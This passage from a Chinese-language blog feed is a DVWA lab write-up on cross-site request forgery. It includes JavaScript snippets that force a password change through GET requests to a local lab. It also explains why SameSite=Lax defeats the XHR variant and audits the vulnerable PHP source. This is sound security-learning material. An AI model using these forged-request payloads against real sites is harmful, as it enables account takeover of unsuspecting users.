srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425143614395_hu218a45c37329024b7d96f4732fad50d1_41557_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425143614395_hu218a45c37329024b7d96f4732fad50d1_41557_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220425143614395"
class="gallery-image"
data-flex-grow="224"
data-flex-basis="538px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425143623579.png"
width="450"
height="287"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425143623579_hu33b023caf2ec6ec6032bf544565c0cbf_18590_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425143623579_hu33b023caf2ec6ec6032bf544565c0cbf_18590_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220425143623579"
class="gallery-image"
data-flex-grow="156"
data-flex-basis="376px"
>&lt;/p>
&lt;p>接着看一眼表单代码。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113815152.png"
width="520"
height="218"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113815152_hu5f2daf098704a2b708824ee309756675_18422_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113815152_hu5f2daf098704a2b708824ee309756675_18422_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220425113815152"
class="gallery-image"
data-flex-grow="238"
data-flex-basis="572px"
>&lt;/p>
&lt;p>只有我觉得&lt;code>form&lt;/code>里&lt;code>method=GET&lt;/code>是很怪的事情吗？感觉学会写 HTML 以来就没想过在 &lt;code>form&lt;/code> 里用 &lt;code>GET&lt;/code> 方法&amp;hellip;&lt;/p>
&lt;p>咳，回到正题。&lt;/p>
&lt;p>到这里踩点差不多就结束了，可以发现 Low 难度下表单没有 CSRF Token 保护，因此可以简单直接写一个 XHR 修改掉密码。&lt;/p>
&lt;h3 id="题解">题解&lt;/h3>
&lt;p>必须先提一个我实际下手写的时候才踩到的坑，浏览器发展速度实在太快了。&lt;/p>
&lt;p>在&lt;a class="link" href="https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-rfc6265bis-05#section-5.3.7" target="_blank" rel="noopener"
>RFC6265bis&lt;/a>里引入了一个新的 Cookies 属性，&lt;code>SameSite&lt;/code>。&lt;a class="link" href="https://developers.google.com/search/blog/2020/01/get-ready-for-new-samesitenone-secure?hl=zh-cn" target="_blank" rel="noopener"
>2019年5月份，谷歌宣布推出了一个默认安全的 Cookie 安全模型&lt;/a>，由新的 Cookie 分类系统（&lt;a class="link" href="https://tools.ietf.org/html/draft-west-cookie-incrementalism-00" target="_blank" rel="noopener"
>规范&lt;/a>）提供支持。在规范（PS：同样是谷歌提出的）中将 &lt;code>SameSite&lt;/code> 默认设置为 &lt;code>Lax&lt;/code>，只允许 Cookies 与顶级导航（包括第三方网站发起的GET请求）一起发送。&lt;/p>
&lt;p>这么说可能有点不好理解，我写了一个简单的 demo，在这项改动之前应该是带上 Cookies 直接发出的请求。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="kd">var&lt;/span> &lt;span class="nx">xhr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">XMLHttpRequest&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="nx">xhr&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;get&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;http://localhost:8080/vulnerabilities/csrf/?password_new=admin&amp;amp;password_conf=admin&amp;amp;Change=Change&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nx">xhr&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">withCredentials&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">true&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nx">xhr&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">send&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>但在这项改动之后（现在是2022年4月25日，Chrome内核版本 100，Edge 浏览器），虽然这是个简单请求，无需预检就会发送，但因为 Cookies 的 &lt;code>SameSite&lt;/code> 属性变更为默认 &lt;code>Lax&lt;/code> 的原因，即使设置了 &lt;code>withCredentials=true&lt;/code> 请求里也不会带上 Cookies。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425150932251.png"
width="951"
height="115"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425150932251_huaa8a43c2711e3dfb7b7a9ac3a293cc3a_19838_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425150932251_huaa8a43c2711e3dfb7b7a9ac3a293cc3a_19838_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220425150932251"
class="gallery-image"
data-flex-grow="826"
data-flex-basis="1984px"
>&lt;/p>
&lt;p>这就有点恼人，不过稍作变通，还是可以直接控制用户的浏览器发起修改密码的请求，只是没 xhr 那么悄无声息。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="nb">window&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">location&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">href&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;http://localhost:8080/vulnerabilities/csrf/?password_new=123456&amp;amp;password_conf=123456&amp;amp;Change=Change&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>如此一来，就满足了 &lt;code>SameSite=Lax&lt;/code> 的由顶级导航启动的要求。&lt;/p>
&lt;p>这里额外再说一句就是，&lt;code>iframe&lt;/code> 似乎也不被视作顶级导航，因此&lt;code>&amp;lt;iframe src=&amp;quot;...&amp;quot; width=&amp;quot;1&amp;quot; height=&amp;quot;1&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code>也行不通，不会带上 Cookies。&lt;/p>
&lt;p>简单看了下 MDN 对默认 &lt;code>Lax&lt;/code> 策略的支持情况，只有少数几个浏览器还没跟进了。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425160233505.png"
width="810"
height="701"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425160233505_hu0375771f01931166adb29727ee7ccafb_54993_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425160233505_hu0375771f01931166adb29727ee7ccafb_54993_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220425160233505"
class="gallery-image"
data-flex-grow="115"
data-flex-basis="277px"
>&lt;/p>
&lt;h3 id="代码审计">代码审计&lt;/h3>
&lt;p>又是很短一段 php 代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;Change&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$pass_new&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;password_new&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="nv">$pass_conf&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;password_conf&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="c1">// Do the passwords match?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$pass_new&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nv">$pass_conf&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// They do!
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$pass_new&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nx">is_object&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nx">mysqli_real_escape_string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$pass_new&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">trigger_error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">E_USER_ERROR&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="nv">$pass_new&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">md5&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$pass_new&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Update the database
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$insert&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;UPDATE `users` SET password = &amp;#39;&lt;/span>&lt;span class="si">$pass_new&lt;/span>&lt;span class="s2">&amp;#39; WHERE user = &amp;#39;&amp;#34;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nx">dvwaCurrentUser&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s2">&amp;#34;&amp;#39;;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">$result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_query&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$insert&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="k">or&lt;/span> &lt;span class="k">die&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">is_object&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nx">mysqli_error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_connect_error&lt;/span>&lt;span class="p">())&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="k">false&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Feedback for the user
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;Password Changed.&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Issue with passwords matching
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;Passwords did not match.&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">((&lt;/span>&lt;span class="nx">is_null&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="k">false&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="nv">$___mysqli_res&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>逻辑很清晰不啰嗦，注意到几个点：&lt;/p>
&lt;ol>
&lt;li>md5 未加盐哈希作为密码字段保存到数据库，得到了哈希有可能被逆推出密码。&lt;/li>
&lt;li>直接拼了 &lt;code>dvwaCurrentUser()&lt;/code>，目前不清楚这个函数里有没有做好转义处理，没处理可能存在 SQL 注入。&lt;/li>
&lt;/ol>
&lt;p>全程这个 &lt;code>$GLOBALS[&amp;quot;___mysqli_ston&amp;quot;]&lt;/code> 到底是个什么玩意儿让我有点懵，搜索了下好像是 SQL 连接，类似 Go 中的 &lt;code>sql.DB&lt;/code> 对象（意会好嘛）。&lt;/p>
&lt;p>别的问题就没看出来了。&lt;/p>
&lt;h3 id="提高难度败北">提高难度（败北）&lt;/h3>
&lt;p>直接使用 Low 难度下的方法，&lt;code>window.location.href&lt;/code>，会报错：&lt;code>That request didn't look correct&lt;/code>。&lt;/p>
&lt;p>简单看一下 Medium 难度下的代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;Change&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Checks to see where the request came from
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">stripos&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_SERVER&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;HTTP_REFERER&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">,&lt;/span>&lt;span class="nv">$_SERVER&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;SERVER_NAME&amp;#39;&lt;/span> &lt;span class="p">])&lt;/span> &lt;span class="o">!==&lt;/span> &lt;span class="k">false&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$pass_new&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;password_new&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="nv">$pass_conf&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;password_conf&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="c1">// Do the passwords match?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$pass_new&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nv">$pass_conf&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// They do!
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$pass_new&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nx">is_object&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nx">mysqli_real_escape_string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$pass_new&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">trigger_error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">E_USER_ERROR&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="nv">$pass_new&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">md5&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$pass_new&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Update the database
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$insert&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;UPDATE `users` SET password = &amp;#39;&lt;/span>&lt;span class="si">$pass_new&lt;/span>&lt;span class="s2">&amp;#39; WHERE user = &amp;#39;&amp;#34;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nx">dvwaCurrentUser&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s2">&amp;#34;&amp;#39;;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">$result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_query&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$insert&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="k">or&lt;/span> &lt;span class="k">die&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">is_object&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nx">mysqli_error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_connect_error&lt;/span>&lt;span class="p">())&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="k">false&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Feedback for the user
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;Password Changed.&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Issue with passwords matching
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;Passwords did not match.&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Didn&amp;#39;t come from a trusted source
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;That request didn&amp;#39;t look correct.&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">((&lt;/span>&lt;span class="nx">is_null&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="k">false&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="nv">$___mysqli_res&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>注意到主要变化在于进入业务处理前，加上了一条判断：&lt;code>if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false )&lt;/code>。&lt;/p>
&lt;p>&lt;code>stripos&lt;/code> 函数查找子串出现在字符串里的位置，没找到的情况下返回&lt;code>false&lt;/code>，这条判断的意思是在 &lt;code>HTTP_REFERER&lt;/code> 里查找 &lt;code>SERVER_NAME&lt;/code> 是否出现，如果出现才进一步处理。所以 Medium 难度下问题变成了怎么 bypass 这个判断。&lt;/p>
&lt;p>搜索 &lt;code>SERVER_NAME&lt;/code> 的文档可以找到这样的说明：&lt;/p>
&lt;blockquote>
&lt;p>&amp;lsquo;SERVER_NAME&amp;rsquo;&lt;/p>
&lt;p>The name of the server host under which the current script is executing. If the script is running on a virtual host, this will be the value defined for that virtual host.&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>Note&lt;/strong>: Under Apache 2, you must set &lt;code>UseCanonicalName = On&lt;/code> and &lt;code>ServerName&lt;/code>. Otherwise, this value reflects the hostname supplied by the client, which can be spoofed. It is not safe to rely on this value in security-dependent contexts.&lt;/p>
&lt;/blockquote>
&lt;/blockquote>
&lt;p>在 Apache2 环境下，如果没有正确配置 &lt;code>UseCanonicalName = On&lt;/code>和&lt;code>ServerName&lt;/code>的话，&lt;code>$_SERVER['SERVER_NAME']&lt;/code>的值就是 HTTP 请求头里的 Hostname。&lt;/p>
&lt;p>&lt;code>HTTP_REFERER&lt;/code> 的文档这样说：&lt;/p>
&lt;blockquote>
&lt;p>&amp;lsquo;HTTP_REFERER&amp;rsquo;&lt;/p>
&lt;p>The address of the page (if any) which referred the user agent to the current page. This is set by the user agent. Not all user agents will set this, and some provide the ability to modify HTTP_REFERER as a feature. In short, it cannot really be trusted.&lt;/p>
&lt;/blockquote>
&lt;p>但遗憾的是，不管 &lt;code>Host&lt;/code> 还是 &lt;code>Referer&lt;/code> 都无法修改（受制于浏览器的约束），所以尽管文档里说可能存在安全隐患，但反正我这会儿想不出利用方法。&lt;/p>
&lt;p>于是看眼帮助文档，提示需要结合 XSS 之类的洞攻破。这么一说就茅塞顿开了，虽然说是个练习靶场但也不是题目说CSRF就非要顶着CSRF死磕，别的洞一个不碰。（大佬说不定能死磕成功，我也想变大佬啊=。=）&lt;/p>
&lt;p>考虑多个漏洞联合利用确实常见也一定要学，但现在暂且还是免了吧=。=累死。后面捅 XSS 的时候再回头顺便把 Medium 难度做了。&lt;/p>
&lt;p>看了眼 High 难度下同样要结合多个漏洞利用，我寻思能突破 CORS 的话即使有 CSRF Token 也好办，直接 xhr 把表单页拿下来就好。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>好的，现在 CSRF 感觉有点难利用了。主要还是现代浏览器的同源策略越来越严格，往默认安全靠拢，迭代速度快的一批。流传下来的利用方法如今一试就寄，半点屁用没有，连搭一个能复现漏洞的环境都麻烦的一批（比如具体哪个版本的 Chrome 修了&lt;code>SameSite&lt;/code>，去哪儿下载历史版本，搞出一堆浏览器共存巴拉巴拉）&lt;/p>
&lt;p>然后就很难不想起互联网上不停重复的观点了。为什么不要做伸手党？抛开对大环境的影响，伸手党一直有个通病，就是没有学习的能力。这里的学习说的是 &lt;em>收集、整理、归纳、总结、利用&lt;/em> 信息的能力。在一个领域独立探索未知，这是真正独立的标志。&lt;/p>
&lt;p>讲真，太怀念上学的日子了，脑子空空无忧无虑。真正出来工作卖力之后才会渐渐意识到什么叫不进则退。我觉得与其说什么社会在惩罚不努力的人，不如说这个社会在惩罚所有人。也不该说是社会，而是人的天性，让人生来就要受尽苦难。&lt;/p>
&lt;p>扯远了。就这样吧。&lt;/p></description></item><item><title>DVWA上手记录-简单尝试</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-02/</link><pubDate>Sun, 24 Apr 2022 15:05:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-02/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>萌新试玩DVWA，Brute Force 和 Command Injection 两道入门题。&lt;/p>
&lt;h2 id="brute-force">Brute Force&lt;/h2>
&lt;h3 id="信息收集">信息收集&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421165951469.png"
width="678"
height="310"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421165951469_hu968bfbff7b3908a335da7115c389096f_24097_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421165951469_hu968bfbff7b3908a335da7115c389096f_24097_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421165951469"
class="gallery-image"
data-flex-grow="218"
data-flex-basis="524px"
>&lt;/p>
&lt;p>表单很简单，尝试随便给个用户名密码会报错。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170044746.png"
width="293"
